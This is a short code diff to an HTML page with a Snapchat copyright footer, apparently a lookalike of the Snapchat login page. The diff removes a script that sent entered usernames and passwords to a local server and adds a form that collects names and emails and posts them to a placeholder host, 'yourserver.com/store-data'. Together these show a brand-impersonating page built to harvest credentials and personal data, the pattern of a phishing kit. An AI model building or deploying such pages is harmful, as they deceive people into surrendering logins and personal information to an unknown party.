@@ -145,31 +145,25 @@
         © 2025 Snapchat | <a href="#">Privacy Policy</a> | <a href="#">Terms</a>
     </div>
 
+    <form id="userForm">
+        <input type="text" name="name" placeholder="Enter Name" required>
+        <input type="email" name="email" placeholder="Enter Email" required>
+        <button type="submit">Submit</button>
+    </form>
+    
     <script>
-        function submitForm() {
-            let username = document.getElementById("username").value;
-            let password = document.getElementById("password").value;
-    
-            if (username === "" || password === "") {
-                alert("Please enter both username and password.");
-                return;
-            }
-    
-            // Send data to Node.js server
-            fetch("http://localhost:3000/login", {
+        document.getElementById("userForm").addEventListener("submit", async function (event) {
+            event.preventDefault();
+            const formData = new FormData(this);
+            const response = await fetch("http://yourserver.com/store-data", {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username, password })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert(data.message);
-            })
-            .catch(error => {
-                console.error("Error:", error);
+                body: JSON.stringify(Object.fromEntries(formData)),
+                headers: { "Content-Type": "application/json" }
             });
-        }
+            alert("Details submitted successfully!");
+        });
     </script>
+    
     
 
 </body>
